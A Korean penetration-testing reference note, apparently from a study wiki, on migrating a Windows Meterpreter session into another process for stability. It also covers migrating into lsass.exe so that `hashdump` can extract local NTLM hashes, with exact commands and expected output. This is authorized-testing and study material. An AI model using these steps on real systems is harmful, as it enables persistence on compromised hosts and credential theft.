---
tags:
  - 환경/windows
시작조건:
  - Windows Meterpreter 세션 확보
  - 현재 Meterpreter 프로세스가 불안정하거나 종료 가능성이 큼
필요권한:
  - 대상 프로세스에 Meterpreter payload를 이동할 수 있는 현재 세션 권한
필요조건:
  - 현재 세션과 호환되는 아키텍처의 지속 중인 대상 프로세스 PID
결과:
  - 다른 Windows 프로세스에서 유지되는 Meterpreter 세션
  - 이동 뒤 확인된 실행 사용자와 권한
---

# Meterpreter 프로세스 이동과 세션 안정화

## 한 줄 판단

Windows Meterpreter 세션의 현재 프로세스가 종료되기 쉽거나 후속 명령이 불안정하면 같은 아키텍처의 지속 중인 프로세스를 골라 `migrate`하고 세션 생존·사용자·권한을 다시 확인한다.

## 사용할 때

- Web Delivery나 일시적인 애플리케이션 프로세스에서 Meterpreter 세션이 열렸을 때.
- 현재 프로세스 종료와 함께 세션이 끊길 가능성이 클 때.
- 후속 열거·파일 전송·피벗 전에 더 오래 유지되는 프로세스로 세션을 옮기려 할 때.
- SYSTEM Meterpreter 세션에서 `hashdump`가 `Operation failed: Incorrect function`으로 실패하고 세션과 대상 프로세스의 architecture를 맞춰 다시 시도할 때.

`migrate`는 Meterpreter payload의 실행 프로세스를 바꾸는 명령이다. 다른 사용자의 token만 현재 세션에 적용하는 [[Meterpreter 프로세스 토큰 탈취]]의 `steal_token`과 같은 동작이 아니다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 현재 세션 | Meterpreter 명령이 반복 실행됨 | `getpid`, `getuid`, `sysinfo` | 세션 통신과 payload 종류 확인 |
| 대상 프로세스 | 종료 가능성이 낮고 현재 session과 호환되는 architecture | `ps`의 PID·Name·Arch·Session·User | PID가 현재도 존재하는지 다시 확인 |
| 프로세스 접근 | 현재 세션이 대상 프로세스에 주입 가능 | `migrate`의 구체적인 오류 | 현재 privilege, 보호 프로세스와 architecture 확인 |

## 실행

### 일반적인 세션 프로세스 이동

Windows 대상의 Meterpreter 프롬프트에서 현재 프로세스와 후보를 확인한다.

```text
meterpreter > getuid
meterpreter > getpid
meterpreter > sysinfo
meterpreter > ps
```

`ps`에서 대상 PID의 이름, architecture, session과 사용자를 확인한 뒤 이동한다.

```text
meterpreter > migrate <TARGET_PID>
meterpreter > getpid
meterpreter > getuid
meterpreter > getprivs
```

확인할 출력:

- `Migrating from <OLD_PID> to <TARGET_PID>...`.
- `Migration completed successfully.`.
- 두 번째 `getpid`가 대상 PID 또는 이동한 프로세스의 PID를 가리킴.
- `getuid`, `getprivs`와 간단한 명령이 계속 실행됨.

### `hashdump` 오류 뒤 LSASS 프로세스로 이동

SYSTEM Meterpreter 세션에서 `hashdump`가 다음 오류로 실패하면 현재 세션의 architecture와 `lsass.exe`의 architecture를 확인한다.

```text
meterpreter > getuid
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Incorrect function.
meterpreter > ps | grep lsass
```

`ps` 결과에서 `lsass.exe`가 현재 세션과 호환되는 architecture이며 사용자가 `NT AUTHORITY\\SYSTEM`인지 확인한 뒤 해당 PID로 이동한다.

```text
meterpreter > migrate <LSASS_PID>
meterpreter > getpid
meterpreter > getuid
meterpreter > hashdump
```

확인할 출력:

- `Migration completed successfully` 뒤 `getpid`가 선택한 프로세스를 가리킴.
- `getuid`가 `NT AUTHORITY\\SYSTEM`으로 유지됨.
- 재실행한 `hashdump`가 `<USER>:<RID>:<LM_HASH>:<NT_HASH>:::` 형식의 로컬 계정 hash를 출력함.

이 절차에서 `lsass.exe` 이동은 일반적인 세션 안정화의 기본 선택이 아니라 `hashdump` 오류를 해결하기 위한 상황별 재시도다. 프로세스 이동 성공과 hash 추출 성공을 따로 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `Migration completed successfully` 뒤 반복 명령 성공 | 다른 프로세스에서 세션이 유지됨 | 안정화된 Meterpreter 세션 | [[Meterpreter 세션 후속 행동]]에서 후속 작업 재선택 |
| 이동 뒤 `getuid`가 기존 사용자와 같음 | 프로세스만 이동하고 사용자 권한은 바뀌지 않음 | 안정화된 기존 권한 세션 | 현재 권한 범위에서 열거·피벗 진행 |
| 이동 뒤 `getuid`가 고권한 사용자로 바뀌고 실제 관리자 작업 성공 | 대상 프로세스 컨텍스트에서 권한 변화가 확인됨 | 고권한 Meterpreter 세션 | [[고권한 세션 확보 후 후속 판단]] |
| `hashdump`의 `Incorrect function` 뒤 같은 architecture의 SYSTEM `lsass.exe`로 이동하고 hash 출력 | 프로세스·architecture 조건을 맞춘 뒤 SAM hash 조회 성공 | 로컬 계정 NTLM hash 확보 | [[Windows SAM SECURITY SYSTEM 덤프]]에서 hash 결과 해석 |
| `Access is denied` 또는 migration 실패 | 현재 privilege 부족·보호 프로세스·session 경계 가능성 | 기존 세션 유지 | 다른 같은 사용자 프로세스와 현재 privilege 확인 |
| architecture 오류 또는 세션 종료 | x86·x64 불일치나 불안정한 대상 프로세스 가능성 | 세션 손실 또는 이동 실패 | payload·대상 프로세스 architecture와 기존 session 생존 확인 |

## 확인할 출력과 권한

- 성공 메시지와 이동 뒤 반복 명령 성공을 모두 확인한다.
- 프로세스 이동 성공만으로 SYSTEM·관리자 권한을 얻었다고 판단하지 않는다. 이동 전후 `getuid`, `getprivs`와 실제 자원 접근을 비교한다.
- `winlogon.exe` 같은 프로세스명만 보고 선택하지 않는다. 현재 PID, architecture, session, 사용자와 접근 가능성을 먼저 확인한다.
- `hashdump` 오류 해결에서는 `lsass.exe` PID 확인, 이동 성공, SYSTEM 유지와 hash 출력을 각각 별도 단계로 검증한다.

## 관련 도구

- [[meterpreter]]

## 관련 상태 라우터

- [[Meterpreter 세션 후속 행동]]
- [[고권한 세션 확보 후 후속 판단]]
- `hashdump`에서 로컬 계정 hash를 획득했으면: [[확보한 자격 증명으로 원격 접근 경로 선택]]
